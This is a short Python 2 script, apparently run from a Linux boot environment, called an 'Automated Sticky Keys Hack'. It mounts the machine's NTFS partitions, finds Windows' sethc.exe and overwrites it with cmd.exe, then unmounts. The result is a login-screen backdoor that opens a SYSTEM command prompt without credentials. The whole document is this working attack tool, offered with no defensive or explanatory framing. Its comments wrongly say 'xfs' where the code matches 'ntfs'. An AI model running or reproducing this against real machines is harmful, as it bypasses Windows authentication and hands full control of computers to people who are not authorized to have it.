! /usr/bin/env python
import subprocess
import re
import os
import os.path

print "Welcome to the Automated Sticky Keys Hack" + "\n"

# Runs lsblk command to determine disks on machine 
disk_list = subprocess.check_output(["lsblk", "-lo", "NAME,FSTYPE,UUID"])

# Defines lists
results = []
final = []

# Appends output of lsblk to a list
for line in disk_list.strip().split():
        results.append(line) 

# Gets index location of "xfs" in the list
xfs_locations = [i for i, x in enumerate(results) if x == "ntfs"]

# Finds xfs in list and takes the uuid value after xfs in the index 
for location in xfs_locations:
    uuid_location = location + 1
    wim = results[uuid_location]
    ming = final.append(wim) 

print "Disk ID's: " + str(final)

# Creates disk directories and mounts disks
def mount_disks():
    for disk_uuid in final:
        os.mkdir("/tmp/disk-" + disk_uuid)
        subprocess.call(["mount", "UUID=" + disk_uuid, "/tmp/disk-" + disk_uuid])

def find_sticky_keys_binary(drive_location):
    if os.path.isfile(drive_location + "/Windows/System32/sethc.exe"):
        print "We have located the Sticky Keys Binary on drive: " + drive_location
        global binary_drive_location 
        binary_drive_location = drive_location

def test_disks():
    for uuid in final:
        find_sticky_keys_binary("/tmp/disk-"+ uuid)

def copy_sticky_keys_in_place():
    subprocess.call(["cp", binary_drive_location + "/Windows/System32/cmd.exe", binary_drive_location + "/Windows/System32/sethc.exe"])

def unmount_disks():
    for disk_uuid in final:
        subprocess.call(["umount", "/tmp/disk-" + disk_uuid])
        
def remove_directories():
    for disk_uuid in final:
        os.rmdir("/tmp/disk-" + disk_uuid)



# Main 
mount_disks()
test_disks()
copy_sticky_keys_in_place()
unmount_disks()
remove_directories()



print '\n' + "End Sticky keys hack... rebooting your machine"
